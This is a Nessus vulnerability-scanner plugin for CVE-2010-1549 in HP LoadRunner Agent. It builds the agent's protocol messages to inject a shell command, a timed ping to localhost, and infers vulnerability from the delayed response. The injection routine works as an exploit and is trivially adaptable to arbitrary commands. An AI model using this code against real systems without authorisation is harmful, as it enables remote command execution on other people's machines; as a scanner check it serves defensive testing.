#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(46255);
  script_version("$Revision: 1.12 $");
  script_cvs_date("$Date: 2016/12/21 22:04:46 $");

  script_cve_id("CVE-2010-1549");
  script_bugtraq_id(39965);
  script_osvdb_id(64437);
  script_xref(name:"TRA", value:"TRA-2010-01");
  script_xref(name:"Secunia", value:"39722");

  script_name(english:"HP Mercury LoadRunner Agent Remote Command Execution");
  script_summary(english:"Sends a command to LoadRunner agent");

  script_set_attribute(attribute:"synopsis", value:
"It is possible to execute arbitrary commands on the remote system.");
  script_set_attribute(attribute:"description", value:
"The version of the LoadRunner Agent installed on the remote host allows
an unauthorized attacker to execute arbitrary commands on the remote
system provided 'Secure Channel' is disabled (which is disabled by
default).");
  script_set_attribute(attribute:"see_also", value:"https://www.tenable.com/security/research/tra-2010-01");
  script_set_attribute(attribute:"see_also", value:"http://www.zerodayinitiative.com/advisories/ZDI-10-080/");
  # https://h20566.www2.hpe.com/hpsc/doc/public/display?docLocale=en&docId=emr_na-c00912968-1
  script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?b43bd418");
  script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2010/May/33");
  script_set_attribute(attribute:"solution", value:
"Upgrade to HP LoadRunner v9.50, and refer to the documentation to
enable 'Secure Channel' communication.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
  script_set_attribute(attribute:"canvas_package", value:'D2ExploitPack');

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/05/06");
  script_set_attribute(attribute:"patch_publication_date", value:"2010/05/05");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/05/07");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:hp:loadrunner");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"Misc.");
  script_copyright(english:"This script is Copyright (C) 2010-2016 Tenable Network Security, Inc.");

  script_dependencies("loadrunner_agent_server_ip_name_overflow.nasl", "os_fingerprint.nasl");
  script_require_ports("Services/loadrunner_agent", 54345);
  exit(0);
}

include("audit.inc");
include("byte_func.inc");
include("global_settings.inc");
include("misc_func.inc");


function mk_padded_string(str)
{
  return mkdword(strlen(str)) + str + crap(data:mkbyte(0), length:(4-(strlen(str) % 4) % 4));
}

# Checks various length fields for conformance
# ---[ Response ]---
# 0x00:  00 00 00 2C 00 00 00 0C 00 00 00 08 00 00 00 01    ...,............
# 0x10:  00 00 00 20 00 00 03 07 00 00 00 01 00 00 00 34    ... ...........4
# 0x20:  00 00 00 01 31 00 00 00 00 00 00 08 00 00 00 00    ....1...........
# 0x30:
#
function check_resp()
{
  local_var blen, dlen, data, pos;

  data = _FCT_ANON_ARGS[0];
  dlen = strlen(data);

  # Check length of first chunk
  blen = getdword(blob:data, pos:0);
  if (blen + 4 > dlen) return FALSE;

  # Get and check first chunk in case response consist of multiple chunks
  if (blen + 4 < dlen)
  {
    data = substr(data, 0, blen + 4 -1);
    dlen = strlen(data);
  }

  # Get and check the length of the first block (two-way msg header)
  pos = 4;
  blen = getdword(blob:data, pos:pos);

  if (blen == 0 || pos + blen > dlen)
    return FALSE;

  # Get and check the length of the second block (the launch msg)
  pos += blen;
  blen = getdword(blob:data, pos:pos);
  if (blen == 0 || pos + blen > dlen)
    return FALSE;

  pos += blen;

  # pos should point to the end
  if (pos != dlen) return FALSE;

  # Length checks OK
  return TRUE;

}
port = get_service(svc: "loadrunner_agent", default: 54345, exit_on_fail: TRUE);

# Check if Security Mode is enabled
secure_channel = get_kb_item("loadrunner_agent/" + port + "/secure_channel");
if (secure_channel) audit(AUDIT_LISTEN_NOT_VULN, "service", port);

# Check port state before sending probes
if (!get_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "TCP");

# Open connection to target
soc = open_sock_tcp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "TCP");

# Define some constants.
guid = base64(str:rand_str(length:17));
rand16 = crap(16);
server_name = "nessus";
server_ip = this_host();
server_port = get_source_port(soc);

os = get_kb_item('Host/OS');

# runtime (in seconds) for our injected command
runtime = 15;
to = get_read_timeout();
if (runtime < to + 10) runtime = to + 10;

# Send multiple pings to the Nessus scanner
phost = 'localhost';
if ('Windows' >< os)
{
  command = 'C:\\Windows\\system32\\cmd.exe';
  parameters = '/C "C:\\Windows\\system32\\ping.exe -n ' + runtime + ' ' + phost + '"';
}
else
{
  command = '/bin/sh';
  parameters = '-c "ping -c ' + runtime + ' ' + phost + '"';
}

req2_1 = mkdword(0x19) + guid + "0";

req2_2 =
      mkdword(6) +
      mk_padded_string(
        str:string(
          "(-server_type=8)",
          "(-server_name=", server_name, ")",
          "(-server_full_name=", server_name, ")",
          "(-server_ip_name=", server_ip, ")",
          "(-server_port=", server_port, ")",
          "(-server_fd_secondary=4)",
          "(-guid_identifier=", guid, ")"
        )
      ) +
      mkdword(0x7530);
req2_2 = mkdword(4 + strlen(req2_2)) + req2_2;
req2_2 =
    mkdword(0x1c) +
    mkdword(0x05) +
    mkdword(0x01) +
    rand16 +
    req2_2;
req2_2 = mkdword(strlen(req2_2)) + req2_2;

req2_3 =
    mkdword(0x437) +
    mkdword(0) +
    mkdword(0x31) +
    mkdword(1) +
    mkdword(0x31000000) +
    mk_padded_string(str:command) +
    mk_padded_string(str:parameters) +
    mkdword(0);
req2_3 = mkdword(4 + strlen(req2_3)) + req2_3;
req2_3 =
    mkdword(0x18) +
    mkdword(0x04) +
    rand16 +
    req2_3;

req2_3 = mkdword(strlen(req2_3)) + req2_3;

req2 = req2_1 + req2_2 + req2_3;

# Send the exploit
send(socket:soc, data:req2);

# Read off the response when the request is processed
res = recv(socket:soc, length:4096);
if (isnull(res)) audit(AUDIT_RESP_NOT, port);

# Check if there is a response when the injected command runtime has elapsed
sleep(3);
res = recv(socket:soc, length:4096, timeout: runtime);
close(soc);

# Vulnerable agent runs the injected command and returns a response
# after the command has finished
if (res)
{
  if (check_resp(res))
    security_hole(port:port);
  else
    audit(AUDIT_RESP_BAD, port);
}
# No response, injected command was not run, service not vulnerable
else audit(AUDIT_LISTEN_NOT_VULN, "service", port);
